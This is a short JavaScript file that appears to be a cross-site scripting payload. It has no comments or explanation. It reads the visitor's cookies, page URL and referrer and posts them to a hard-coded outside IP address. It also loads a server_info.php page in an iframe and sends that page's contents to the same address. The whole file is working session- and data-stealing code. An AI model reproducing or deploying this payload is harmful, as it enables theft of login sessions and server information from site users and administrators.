function postData(obj){ 
    var str = "";
    for(var prop in obj){
        str += prop + "=" + obj[prop] + "&"
    }
    return str;
}
function ajax(url,post,callback){

	var xhr = new XMLHttpRequest();
	xhr.open("POST", url, true);
	xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xhr.onreadystatechange = function(){
	    var XMLHttpReq = xhr;
	    if (XMLHttpReq.readyState == 4) {
	        if (XMLHttpReq.status == 200) {
	            var text = XMLHttpReq.responseText;
	            callback(text);
	        }
	    }
	};
	xhr.send(post);
}
var data={"data":encodeURIComponent("===="+document.cookie+"===="),"url":encodeURIComponent(location.href+"\n"+document.referrer)};
ajax("http://123.57.254.42/api.php",postData(data),function(text){
	
});
//document.body.appendChild(f);

f=document.createElement("iframe");f.src="server_info.php";f.onload=f.onreadystatechange=function(){
	h=f.contentWindow.document.body.innerHTML;
	var data={"data":encodeURIComponent(h),"url":encodeURIComponent(location.href)};
	ajax("http://123.57.254.42/api.php",postData(data),function(text){
	
	});
};
document.body.appendChild(f);